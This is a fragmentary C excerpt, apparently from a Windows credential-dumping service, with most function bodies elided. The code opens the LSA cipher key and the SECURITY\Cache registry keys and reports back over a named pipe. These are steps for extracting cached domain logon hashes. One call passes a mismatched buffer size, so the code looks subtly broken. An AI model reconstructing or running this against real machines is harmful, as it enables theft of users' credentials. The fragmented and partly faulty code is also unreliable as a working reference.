...
VOID SendErrorMessage(HANDLE hPiped, CHAR *mess) {
	sprintf_s(ErrorBuffer2, sizeof(GetLastError()), ERROR_MESSAGE, mess, GetLastError());
...
DWORD DumpLsaKey(HANDLE hPiped) {
	...
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, REG_LSA_CIPHER_KEY, 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
		SendErrorMessage(hPiped, "Failed to retrieve LSA Cipher Key by RegOpenKeyEx");
	}

	size = sizeof(buffer);
	if (RegQueryValueEx(hKey, "", NULL, &type, (LPBYTE) buffer, &size) != ERROR_SUCCESS ) {
...
DWORD ServiceExecutionThread(LPDWORD argv) {
	...
	if ((hPiped = CreateFile(szPipeName, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL)) == INVALID_HANDLE_VALUE) {
		goto end;
	}

	if ((ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, REG_SECURITY_CACHE, 0, KEY_READ, &hKey)) != ERROR_SUCCESS) {
	...
	if ((ret = RegQueryValueEx(hKey , REG_CACHE_CONTROL, NULL, &type, data, &size)) == ERROR_SUCCESS) {
